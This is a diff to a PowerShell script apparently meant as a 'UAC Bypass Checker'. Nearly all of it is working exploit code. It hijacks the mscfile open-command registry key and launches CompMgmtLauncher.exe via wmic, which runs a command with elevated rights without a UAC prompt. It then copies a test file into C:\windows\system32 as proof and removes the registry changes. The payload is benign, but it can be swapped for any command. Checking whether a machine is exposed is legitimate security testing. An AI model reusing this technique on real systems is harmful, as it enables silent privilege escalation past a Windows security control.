@@ -14,13 +14,11 @@ UAC Bypass Checker
 	else{
 		Echo "[*] UAC Status OK and set to 'Default'."
 		
-		$userinput = Read-Host -Prompt 'Input your username'
-		
-		New-Item -Path 'C:\users\$userinput\desktop\test.txt' -ItemType File
+		New-Item -Path 'C:\users\CHANGETHIS\desktop\test.txt' -ItemType File
 		
 		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
 		$ValName = "(Default)"
-		$RegValue = "cmd /c copy C:\users\$userinput\desktop\test.txt C:\windows\system32\test.txt"
+		$RegValue = "cmd /c copy C:\users\CHANGETHIS\desktop\test.txt C:\windows\system32\test.txt"
 
 		New-Item -Path $MscRegPath -Force | Out-Null
 		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null
@@ -28,8 +26,10 @@ UAC Bypass Checker
 		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
 		$a_cmd = "C:\windows\system32\cmd.exe"
 		&$a_cmd = $CompMgmtBypass
-		gci -Recurse -Filter "test" -File -ErrorAction SilentlyContinue -Path "C:\windows\system32\"
-
+		Start-Sleep -s 3
+		Echo "`n`THIS IS THE test.txt FILE IN C:\windows\system32 `n``n`THIS MEANS THAT UAC CAN BE BYPASSED`n``"
+		gci -Recurse -Filter "test" -ErrorAction SilentlyContinue -Path "C:\windows\system32\"
+		
 		Start-Sleep -s 5
 
 		# Clenup registry modifications
